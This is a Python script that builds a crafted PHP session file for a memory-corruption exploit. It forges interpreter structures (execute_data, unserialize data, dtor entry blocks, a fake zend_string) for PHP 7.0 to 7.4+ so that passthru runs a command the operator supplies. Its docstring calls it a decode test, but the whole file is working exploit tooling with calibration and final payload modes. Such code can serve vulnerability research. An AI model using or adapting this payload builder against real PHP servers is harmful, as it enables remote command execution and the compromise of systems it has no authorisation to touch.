#!/usr/bin/env python3
"""Build a php_binary session file for the per-version zif_passthru decode test.

Record 1 key (96 or 112 bytes) carries the fake execute_data fields; its integer
value is the decode target.  Record 2's string payload carries the fake stale
P/B0 and the fake zend_string F for the command.

Old layout (7.0-7.3) var_dtor_entries is { zval data[1024]; long used_slots; void *next; }
so used_slots lives at B0+0x4000 and data at B0+0.  New layout (7.4+) is
{ long used_slots; void *next; zval data[1018]; } so data starts at B0+0x10.
"""
import argparse, json, os, struct

F_PAYLOAD_OFF = 0x100
CMD_LEN_OFF = F_PAYLOAD_OFF + 0x10
CMD_OFF = F_PAYLOAD_OFF + 0x18


def build(path, total, mode, key_len=96, arg1_off=0x50, type_off=0x58,
          old_dtor=False, p_size=72, x1=0, x2=0, p=0, b0=0,
          cmd=b'', target=0, a_target=0, zero_payload=False, verbose=True,
          real_p=False, p_last=0, key_text=b'', frame=True):
    val = ('i:%d;' % target).encode()
    if key_text:
        assert len(key_text) <= key_len, (len(key_text), key_len)
        key1 = bytearray(key_text + b' ' * (key_len - len(key_text)))
    else:
        key1 = bytearray(b'A' * key_len)
    if frame:
        key1[0x2c - 1:0x2f] = struct.pack('<I', 1)          # EX_NUM_ARGS = 1
        key1[arg1_off - 1:arg1_off + 7] = struct.pack('<Q', 0)
        key1[type_off - 1] = 6                               # arg1 IS_STRING
    rec1 = bytes([key_len]) + bytes(key1) + val
    R = len(rec1)

    L = total - R - 2
    for _ in range(12):
        prefix2 = b'\x01z' + b's:' + str(L).encode() + b':"'
        nl = total - R - len(prefix2) - 2
        if nl == L:
            break
        L = nl
    prefix2 = b'\x01z' + b's:' + str(L).encode() + b':"'
    Q = R + len(prefix2)

    # Patch the arg1 pointer now that Q is fixed.
    if mode == 'final' and not zero_payload and frame:
        assert x2, 'final mode needs x2'
        F = x2 + 0x18 + Q + F_PAYLOAD_OFF
        key1[arg1_off - 1:arg1_off + 7] = struct.pack('<Q', F)
        rec1 = bytes([key_len]) + bytes(key1) + val
        assert len(rec1) == R

    payload = bytearray(L)
    meta = {'path': path, 'mode': mode, 'zero_payload': zero_payload,
            'total': total, 'rec1_len': R, 'L': L, 'payload_start': Q,
            'key_len': key_len, 'arg1_off': arg1_off, 'type_off': type_off,
            'old_dtor': old_dtor, 'p_size': p_size, 'frame': frame,
            'key_text': key_text.decode('latin1'),
            'X1': hex(x1) if x1 else None, 'X2': hex(x2) if x2 else None,
            'P': hex(p) if p else None, 'B0': hex(b0) if b0 else None,
            'A_target': hex(a_target) if a_target else None,
            'value': val.decode()}

    if real_p and not zero_payload:
        # Old-layout (7.0-7.3) variant: the stale php_unserialize_data is only
        # 32 bytes and is NOT covered by the session buffer, but the real
        # var_dtor_entries block B0 sits at (or near) the session string base,
        # so the file can rewrite B0->used_slots and var_entries->used_slots.
        assert x1 and b0 and p_last, 'real-p needs x1/b0/p_last'
        b_off = b0 - (x1 + 24)          # file offset of the fake dtor block
        ve_off = p_last + 0x2000 - (x1 + 24)
        b_idx = b_off - Q                # index inside the payload
        ve_idx = ve_off - Q
        assert 0 <= b_idx + 0x4000 and b_idx + 0x4010 <= L, \
            ('real B0 used_slots outside file', hex(b_off), hex(Q), hex(L))
        assert 0 <= ve_idx and ve_idx + 8 <= L, \
            ('real var_entries outside file', hex(ve_off), hex(Q), hex(L))
        assert a_target, 'real-p needs a_target'
        K = (a_target - b0) // 16
        assert (a_target - b0) % 16 == 0
        payload[b_idx + 0x4000:b_idx + 0x4008] = struct.pack('<q', K)
        payload[b_idx + 0x4008:b_idx + 0x4010] = struct.pack('<Q', 0)
        payload[ve_idx:ve_idx + 8] = struct.pack('<q', 0)
        payload[CMD_LEN_OFF:CMD_LEN_OFF + 8] = struct.pack('<Q', len(cmd))
        payload[CMD_OFF:CMD_OFF + len(cmd)] = cmd
        payload[CMD_OFF + len(cmd)] = 0
        meta.update({'p_off': None, 'b_off': hex(b_off), 'p_idx': None,
                     'b_idx': hex(b_idx), 've_off': hex(ve_off), 've_idx': hex(ve_idx),
                     'used_slots_file_off': hex(Q + b_idx + 0x4000), 'K': K,
                     'F': hex(x2 + 0x18 + Q + F_PAYLOAD_OFF) if (x2 and frame) else None,
                     'F_off': Q + F_PAYLOAD_OFF,
                     'cmd_len_off': Q + CMD_LEN_OFF, 'cmd_off': Q + CMD_OFF,
                     'cmd': cmd.decode('latin1')})
        data = rec1 + prefix2 + bytes(payload) + b'";'
        assert len(data) == total, (len(data), total)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'wb') as fp:
            fp.write(data)
        if verbose:
            print(json.dumps(meta, indent=1))
        return meta
    if not zero_payload:
        assert x1 and p and b0, 'non-zero payload needs x1/p/b0'
        p_off = p - (x1 + 24)
        b_off = b0 - (x1 + 24)
        p_idx = p_off - Q
        b_idx = b_off - Q
        assert 0 <= p_idx, ('fake P before payload', hex(p_off), hex(p_idx))
        assert 0 <= b_idx, ('fake B0 before payload', hex(b_off), hex(b_idx))
        assert p_idx + p_size <= L, ('fake P outside payload', hex(p_idx), hex(L))
        if old_dtor:
            # php_unserialize_data { first, last, first_dtor, last_dtor [, allowed_classes] }
            struct.pack_into('<QQ', payload, p_idx, 0, 0)
            struct.pack_into('<QQ', payload, p_idx + 16, b0, b0)
            if p_size >= 40:
                struct.pack_into('<Q', payload, p_idx + 32, 0)
            assert b_idx + 0x4010 <= L, ('old B0 used_slots outside payload', hex(b_idx + 0x4010), hex(L))
        else:
            f = struct.pack('<QQQQQQQQ', p + 56, b0, b0, 0, 0, 0, 0x7fffffff, 1018)
            payload[p_idx:p_idx + len(f)] = f
            payload[p_idx + 64:p_idx + 72] = struct.pack('<Q', 0)
            assert b_idx + 16 <= L
        if mode == 'calib':
            K = 0
        elif old_dtor:
            K = (a_target - b0) // 16
        else:
            K = (a_target - (b0 + 16)) // 16
        assert (a_target - b0) % 16 == 0 if old_dtor else (a_target - (b0 + 16)) % 16 == 0
        if old_dtor:
            payload[b_idx + 0x4000:b_idx + 0x4008] = struct.pack('<q', K)
            payload[b_idx + 0x4008:b_idx + 0x4010] = struct.pack('<Q', 0)
        else:
            payload[b_idx:b_idx + 8] = struct.pack('<q', K)
            payload[b_idx + 8:b_idx + 16] = struct.pack('<Q', 0)
        payload[CMD_LEN_OFF:CMD_LEN_OFF + 8] = struct.pack('<Q', len(cmd))
        payload[CMD_OFF:CMD_OFF + len(cmd)] = cmd
        payload[CMD_OFF + len(cmd)] = 0
        assert CMD_OFF + len(cmd) + 1 < L
        meta.update({'p_off': hex(p_off), 'b_off': hex(b_off),
                     'p_idx': p_idx, 'b_idx': b_idx, 'K': K,
                     'F': hex(x2 + 0x18 + Q + F_PAYLOAD_OFF) if x2 else None,
                     'F_off': Q + F_PAYLOAD_OFF,
                     'cmd_len_off': Q + CMD_LEN_OFF, 'cmd_off': Q + CMD_OFF,
                     'cmd': cmd.decode('latin1')})
    else:
        meta.update({'p_idx': None, 'b_idx': None, 'K': None, 'F': None,
                     'F_off': Q + F_PAYLOAD_OFF})

    data = rec1 + prefix2 + bytes(payload) + b'";'
    assert len(data) == total, (len(data), total)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'wb') as fp:
        fp.write(data)
    if verbose:
        print(json.dumps(meta, indent=1))
    return meta


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--out', required=True)
    ap.add_argument('--total', type=int, default=131014)
    ap.add_argument('--mode', choices=['calib', 'final'], default='calib')
    ap.add_argument('--key-len', type=int, default=96)
    ap.add_argument('--arg1-off', type=lambda s: int(s, 0), default=0x50)
    ap.add_argument('--type-off', type=lambda s: int(s, 0), default=0x58)
    ap.add_argument('--old-dtor', action='store_true')
    ap.add_argument('--p-size', type=int, default=72)
    ap.add_argument('--x1', type=lambda s: int(s, 0), default=0)
    ap.add_argument('--x2', type=lambda s: int(s, 0), default=0)
    ap.add_argument('--p', type=lambda s: int(s, 0), default=0)
    ap.add_argument('--b0', type=lambda s: int(s, 0), default=0)
    ap.add_argument('--cmd', default='')
    ap.add_argument('--target', type=lambda s: int(s, 0), default=0)
    ap.add_argument('--a-target', type=lambda s: int(s, 0), default=0)
    ap.add_argument('--zero-payload', action='store_true')
    ap.add_argument('--meta', default=None)
    ap.add_argument('--real-p', action='store_true')
    ap.add_argument('--p-last', type=lambda s: int(s, 0), default=0)
    ap.add_argument('--key-text', default='')
    ap.add_argument('--no-frame', action='store_true')
    a = ap.parse_args()
    meta = build(a.out, a.total, a.mode, a.key_len, a.arg1_off, a.type_off,
                 a.old_dtor, a.p_size, a.x1, a.x2, a.p, a.b0,
                 a.cmd.encode(), a.target, a.a_target, a.zero_payload, verbose=True,
                 real_p=a.real_p, p_last=a.p_last,
                 key_text=a.key_text.encode('latin1'), frame=not a.no_frame)
    if a.meta:
        with open(a.meta, 'w') as fp:
            json.dump(meta, fp, indent=1)


if __name__ == '__main__':
    main()
